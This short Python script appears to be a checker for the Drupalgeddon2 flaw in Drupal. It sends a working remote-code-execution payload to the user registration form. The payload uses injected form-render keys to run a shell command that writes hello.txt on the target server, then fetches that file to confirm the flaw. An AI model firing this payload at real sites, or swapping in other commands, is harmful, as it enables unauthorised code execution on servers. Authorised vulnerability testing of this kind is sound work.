import re
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_drupalgeddon2(target):
    # Arguments:
    #   target (str): Website to be tested.
    # Returns:
    #   1 if the target is vulnerable
    #   0 if the target is not vulnerable
    verify = False    
    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo hello world | tee hello.txt'}
     
    r = requests.post(url, data=payload, verify=verify)
    print(r.status_code)
    check = requests.get(target + 'hello.txt')
    print(check.status_code)
    if check.status_code != 200:
        return 0
    else:
        return 1
    
